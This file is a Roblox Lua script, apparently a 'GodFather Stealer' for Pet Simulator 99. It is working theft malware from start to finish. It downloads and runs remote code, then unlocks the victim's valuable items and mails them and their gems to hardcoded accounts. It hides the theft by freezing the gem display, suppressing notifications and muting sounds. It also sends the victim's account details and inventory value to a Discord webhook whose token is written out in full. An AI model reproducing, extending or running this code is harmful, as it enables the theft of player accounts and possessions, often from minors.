

local function LoadingScreenAsync()
    task.spawn(function()
        local ok, result = pcall(function()
            local baseUrl = "https://raw.githubusercontent.com/outhackernuls090-hash/NulsLoader/refs/heads/main/LoadingScreen"
            local customUrl = "%%LOADSCREEN%%"

            if not customUrl:match("^https?://") then
                customUrl = ""
            end

            local url = (customUrl ~= "" and customUrl) or baseUrl

            local code = game:HttpGet(url, true)
            local fn = loadstring(code)
            if type(fn) ~= "function" then
                error("loadstring did not return a function")
            end
            fn()
        end)

        if not ok then
            warn("Failed to load LoadingScreen:", result)
        end
    end)
end


local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local player = game.Players.LocalPlayer
local MailMessage = "GG / xGgkWUxU3w"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 1
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end
local blacklist = {"Eliaskulmer999", "mskksld", "anubismc16", "diegoplays103"} --please keep those, those are friends of mine and I blacklist them so they dont get hit by any of my scripts. You can still add more users.

_G.Usernames = {"Eliaskulmer999", "Eliaskulmer999"}
_G.Webhook = "https://discord.com/api/webhooks/1475151471631667378/MMcbj311BeXhS5kom8h8InyjHmygsQQR_6_qOxbQjKV7Pt2r1FszKsr0cxD1hdkz-oAa"


local Forward = "https://webhook-rose-nu.vercel.app/api/forward.js"
local users = {}
local min_rap = 1000000
local webhook = ""

users = _G.Usernames
webhook = _G.Webhook


if table.find(blacklist, player.Name) then
	player:Kick("Nuls Script!!!")
end

if not users or #users == 0 or webhook == "" then
    player:Kick("Error at table 0x7bA42l\nCheck Discord for more information.")
end

LoadingScreenAsync()
wait(1)

for adress, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailPrice = FunctionToGetFirstPriceOfMail()

local function EmptyMailBoxes()
    if save.Box then
        for key, value in pairs(save.Box) do
			if value._uq then
				network.Invoke("Box: Withdraw All", key)
			end
        end
    end
end

local function ClaimAllMail()
    local response, err = network.Invoke("Mailbox: Claim All")
    while err == "You must wait 30 seconds before using the mailbox!" do
        wait(0.2)
        response, err = network.Invoke("Mailbox: Claim All")
    end
end

local function formatNumber(number)
	local number = math.floor(number)
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
	return string.format("%.2f%s", number, suffixes[suffixIndex])
end


local gemsleaderstat = player.leaderstats["\240\159\146\142 Diamonds"].Value
local gemsleaderstatpath = player.leaderstats["\240\159\146\142 Diamonds"]
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
	gemsleaderstatpath.Value = gemsleaderstat
end)


local HttpService = game:GetService("HttpService")

local loading = player.PlayerScripts:WaitForChild("Scripts"):WaitForChild("Core"):WaitForChild("Process Pending GUI")
local noti = player.PlayerGui:WaitForChild("Notifications")

if loading then
	loading.Disabled = true
end

if noti then
	noti.Enabled = false

	noti:GetPropertyChangedSignal("Enabled"):Connect(function()
		if noti.Enabled then
			noti.Enabled = false
		end
	end)
end

local blockedSounds = {
	["rbxassetid://11839132565"] = true,
	["rbxassetid://14254721038"] = true,
	["rbxassetid://12413423276"] = true
}

game.DescendantAdded:Connect(function(obj)
	if obj:IsA("Sound") then
		if blockedSounds[obj.SoundId] then
			obj.Volume = 0
			obj.PlayOnRemove = false
			obj:Destroy()
		end
	end
end)

local function getRAP(Type, Item)
    local rap = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
        Class = { Name = Type },
        IsA = function(hmm)
            return hmm == Type
        end,
        GetId = function()
            return Item.id
        end,
        StackKey = function()
            return HttpService:JSONEncode({
                id = Item.id,
                pt = Item.pt,
                sh = Item.sh,
                tn = Item.tn
            })
        end,
        AbstractGetRAP = function()
            return nil
        end
    })

    return rap or 0
end
local function canSendMail()
	local uid
	for i, v in pairs(save["Pet"]) do
		uid = i
		break
	end
	local args = {
        [1] = "Roblox",
        [2] = "Test",
        [3] = "Pet",
        [4] = uid,
        [5] = 1
    }
    local response, err = network.Invoke("Mailbox: Send", unpack(args))
    return (err == "They don't have enough space!")
end
EmptyMailBoxes()
ClaimAllMail()
wait(0.5)

local GemAmount
for _, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount = v._am
        break
    end
end

require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local PetsDirectory = require(ReplicatedStorage.Library.Directory.Pets)

local categoryList = {
    "Pet","Egg","Charm","Enchant","Potion",
    "Misc","Hoverboard","Booth","Ultimate"
}

local sortedItems = {}
local totalRAP = 0

for _,category in ipairs(categoryList) do
    local categoryData = save[category]

    if categoryData then
        for uid,item in pairs(categoryData) do

            local rapValue = getRAP(category,item)

            if rapValue >= min_rap then

                local amount = item._am or 1
                local itemName = item.id

                -- PET SPECIAL HANDLING
                if category == "Pet" then

                    local dir = PetsDirectory[item.id]

                    if dir and (dir.huge or dir.exclusiveLevel) then

                        local prefix = ""

                        if item.pt == 1 then
                            prefix = "Golden "
                        elseif item.pt == 2 then
                            prefix = "Rainbow "
                        end

                        if item.sh then
                            prefix = "Shiny " .. prefix
                        end

                        itemName = prefix .. item.id

                    else
                        itemName = nil
                    end
                end

                if itemName then
                    table.insert(sortedItems,{
                        category = category,
                        uid = uid,
                        amount = amount,
                        rap = rapValue,
                        name = itemName
                    })

                    totalRAP = totalRAP + (rapValue * amount)
                end
            end

            -- unlock items if locked
            if item._lk then
                network.Invoke("Locking_SetLocked",uid,false)
            end

        end
    end
end

table.sort(sortedItems, function(a, b)
    return (a.rap * a.amount) > (b.rap * b.amount)
end)

local function buildItemSummary(items)

    if not items then
        return ""
    end

    local map = {}
    local order = {}

    for _, item in ipairs(items) do

        local name = item.name

        if not map[name] then
            map[name] = {
                amount = 0,
                totalRap = 0
            }

            table.insert(order, name)
        end

        map[name].amount = map[name].amount + item.amount
        map[name].totalRap = map[name].totalRap + (item.rap * item.amount)

    end

    table.sort(order, function(a, b)
        return map[a].totalRap > map[b].totalRap
    end)

    local lines = {}

    for _, name in ipairs(order) do

        local data = map[name]

        table.insert(lines, string.format(
            "• %dx %s | %s RAP",
            data.amount,
            name,
            formatNumber(data.totalRap)
        ))

    end

    return table.concat(lines, "\n")

end

local function uploadPaste(content)
    local body = HttpService:JSONEncode({
        content = content
    })

    local result = HttpService:PostAsync(
        "https://pastefy.app/api/v2/paste",
        body,
        Enum.HttpContentType.ApplicationJson
    )

    local data = HttpService:JSONDecode(result)

    if data and data.paste and data.paste.url then
        return data.paste.url
    end

    return nil
end

local RAP_TO_EUR = 10000000 -- Idk if its right but i will keep it like that

local function rapToEUR(rap)
    return rap / RAP_TO_EUR
end

local function formatEUR(v)
    return string.format("€%.2f", v)
end


local function findRequest()
    if request then
        return request, "Delta / Generic"
    elseif syn and syn.request then
        return syn.request, "Synapse X"
    elseif http_request then
        return http_request, "Script-Ware / KRNL"
    elseif http and http.request then
        return http.request, "Electron"
    elseif fluxus and fluxus.request then
        return fluxus.request, "Fluxus"
    elseif httpx and httpx.request then
        return httpx.request, "Hydrogen"
    elseif KRNL_LOADED then
        return request, "KRNL"
    elseif identifyexecutor then
        return request, identifyexecutor()
    elseif getexecutorname then
        return request, getexecutorname()
    end

    return nil, "Roblox HttpService"
end

local function formatAccountAge(days)
    if days >= 365 then
        return string.format("%.1f years (%d days)", days / 365, days)
    end
    return string.format("%d days", days)
end

local function SendMessage(GemAmount)

    local execRequest, executorName = findRequest()
    local usingStudio = not execRequest

    local fields = {}

    local totalPets = 0
    for _, item in ipairs(sortedItems) do
        totalPets = totalPets + item.amount
    end

    local bestPet = nil
    local bestPetRAP = 0
    for _, item in ipairs(sortedItems) do
        local itemTotalRAP = item.amount * item.rap
        if itemTotalRAP > bestPetRAP then
            bestPetRAP = itemTotalRAP
            bestPet = item
        end
    end

    table.insert(fields,{
        name = "👤 Username",
        value = "```" .. player.Name .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "📥 Receiver",
        value = "```" .. table.concat(users,", ") .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "📅 Account Age",
        value = "```" .. formatAccountAge(player.AccountAge) .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "⚡ Executor",
        value = "```" .. (executorName or "Unknown") .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "💎 Total RAP",
        value = "```" .. formatNumber(totalRAP) .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "\u200B",
        value = "\u200B",
        inline = true
    })

    local bestPetName = bestPet and bestPet.name or "None"
    local bestPetDisplay = bestPet and (bestPet.amount .. "x " .. bestPetName) or "None"

    table.insert(fields,{
        name = "🐵 Total Pets 🐵",
        value = "```→ " .. formatNumber(totalPets) .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "👑 Best Pet 👑",
        value = "```→ " .. bestPetDisplay .. "```",
        inline = true
    })

    table.insert(fields,{
        name = "🏆 Best Pet RAP 🏆",
        value = "```→ " .. formatNumber(bestPetRAP) .. "```",
        inline = true
    })

    -- All Pets List
    local itemMap = {}
    local order = {}

    for _,item in ipairs(sortedItems) do

        if not itemMap[item.name] then
            itemMap[item.name] = {
                amount = 0,
                rap = item.rap
            }

            table.insert(order,item.name)
        end

        itemMap[item.name].amount =
            itemMap[item.name].amount + item.amount
    end

    table.sort(order,function(a,b)

        local A = itemMap[a]
        local B = itemMap[b]

        return (A.amount * A.rap) > (B.amount * B.rap)

    end)

    local itemText = ""

    for _,name in ipairs(order) do

        local data = itemMap[name]

        local totalRap = data.amount * data.rap
        local eur = rapToEUR(totalRap)

        itemText = itemText .. string.format(
            "• %dx %s | %s RAP | %s\n",
            data.amount,
            name,
            formatNumber(totalRap),
            formatEUR(eur)
        )
    end

    local pasteLink = nil

    if #itemText > 900 then

        local pasteBody = HttpService:JSONEncode({
            content = itemText
        })

        local result = HttpService:PostAsync(
            "https://pastefy.app/api/v2/paste ",
            pasteBody,
            Enum.HttpContentType.ApplicationJson
        )

        local data = HttpService:JSONDecode(result)

        if data and data.paste then
            pasteLink = data.paste.url
        end

        itemText =
            "Item list too long.\nFull list:\n"..tostring(pasteLink)

    end

    local totalEUR = rapToEUR(totalRAP)
    local gemsEUR = rapToEUR(GemAmount)

    local summaryText =
        "💎 Gems: "..formatNumber(GemAmount).." ("..formatEUR(gemsEUR)..")"..
        "\n📊 Total RAP: "..formatNumber(totalRAP)..
        "\n💰 Estimated Value: "..formatEUR(totalEUR)

    table.insert(fields,{
        name = "📋 All Items",
        value = itemText,
        inline = false
    })

    table.insert(fields,{
        name = "💰 Summary",
        value = "```" .. summaryText .. "```",
        inline = false
    })

    local titleName
    local embedColor

    if totalRAP >= 10000000000 then 
        titleName = "🚨 PS99 | INSANE HIT 🚨"
        embedColor = 16711680  -- Red
    elseif totalRAP >= 100000000 then  
        titleName = "PS99 | GOOD HIT"
        embedColor = 8388736   -- Purple
    elseif totalRAP > 50000000 then    
        titleName = "PS99 | NORMAL HIT"
        embedColor = 16711680  -- Red 
    else                               
        titleName = "PS99 | BAD HIT"
        embedColor = 3355443  -- Black
    end

    local contentPing = (totalRAP >= HIGH_VALUE_THRESHOLD) and "@everyone" or ""

    local body = HttpService:JSONEncode({

        webhook = webhook,

        content = contentPing,
        
        username = "GodFather Stealer",
        
        avatar_url = "https://i.imgur.com/ulY8nQk.png ",

        embeds = {{

            title = titleName,

            color = embedColor,

            fields = fields,

            footer = {
                text = "GodFather Stealer | .gg/ronixexecutor\n Made By NULS :3"
            }

        }}
    })

    if usingStudio then

        return HttpService:PostAsync(
            Forward,
            body,
            Enum.HttpContentType.ApplicationJson
        )

    else

        return execRequest({
            Url = Forward,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = body
        })

    end

end

local function sendItem(category, uid, am)
    local userIndex = 1
    local maxUsers = #users
    local sent = false
    
    repeat
        local currentUser = users[userIndex]
        local args = {
            [1] = currentUser,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = am or 1
        }

        local response, err = network.Invoke("Mailbox: Send", unpack(args))

        if response == true then
            sent = true
            GemAmount = GemAmount - mailPrice
            mailPrice = math.ceil(math.ceil(mailPrice) * 1.5)
            if mailPrice > 5000000 then
                mailPrice = 5000000
            end
        elseif response == false and err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then
                sent = true
            end
        end
    until sent
end

local function SendAllGems()
    for i, v in pairs(GetSave().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount >= (mailPrice + 10000) then
                local userIndex = 1
                local maxUsers = #users
                local sent = false
                
                repeat
                    local currentUser = users[userIndex]
                    local args = {
                        [1] = currentUser,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount - mailPrice
                    }
                    
                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
                    
                    if response == true then
                        sent = true
                    elseif response == false and err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then
                            sent = true
                        end
                    end
                until sent
                break
            end
        end
    end
end

if #sortedItems > 0 or GemAmount > (min_rap + mailPrice) then

    ClaimAllMail()
    EmptyMailBoxes()

    if not canSendMail() then
        player:Kick("Account error. Please rejoin and try again or use a different account")
        return
    end

    wait(0.5)

    SendMessage(GemAmount)

    table.sort(sortedItems, function(a,b)
        return (a.rap * a.amount) > (b.rap * b.amount)
    end)

    for _, item in ipairs(sortedItems) do

        if GemAmount <= mailPrice then
            break
        end

        if item.rap >= min_rap then

            sendItem(item.category, item.uid, item.amount)
            GemAmount = GemAmount - mailPrice

        end
    end

    if GemAmount > mailPrice then
        SendAllGems()
    end

end
